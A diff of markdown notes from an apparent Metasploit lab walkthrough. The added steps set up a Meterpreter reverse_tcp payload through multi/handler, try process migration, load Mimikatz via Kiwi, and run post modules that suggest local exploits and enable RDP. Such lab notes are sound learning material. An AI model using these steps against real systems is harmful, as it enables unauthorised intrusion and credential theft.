@@ -28,6 +28,7 @@
 *  Load - Used to load the module
 *  Hosts - To view hosts saved in DB
 *  Services - To view services saved in DB with respect to hosts
+*  Vulns - To view discovered vulnerabilities from the DB with respect to hosts 
 
 **Modules**  
 Metasploit have 6 core modules -  
@@ -39,7 +40,7 @@ Metasploit have 6 core modules -
 *  Post-Exploitation - Once in the machine, we can use the modules from this category for more
 
 
-**Exploiting**
+**Exp**
 
 ```
 IP = 10.10.222.240
@@ -60,4 +61,35 @@ Following ports were open -
 Hosts and services command show output as follows now
 ![Alt text](./Hosts_Services.png)  
 
+
+Using handler exploit found under -  
+exploit/multi/handler
+
+Set the payload to -  
+Windows/meterpreter/reverse_tcp
+```
+SET PAYLOAD windows/meterpreter/reverse_tcp
+```
+And also set the LHOST and RHOST accordingly  
+
+Using _Exploit_. Was able to send the payload and got the meterpreter session  
+
+After the getting the shell, to migrate we used
+```
+migrate 1264(process of spoolsv.exe.)
+```
+Failed due to lack of privileges  
+
+Used _sysinfo_ to get more info about system  
+
+Loaded Mimikatz using _Load Kiwi_
+
+Can use upload/download to do as the name says  
+
+Ran a couple of modules  
+post/multi/recon/local_exploit_suggester  
+post/windows/gather/checkvm  
+post/windows/manage/enable_rdp  
+
+![](Some_Meterpreter.png)
 
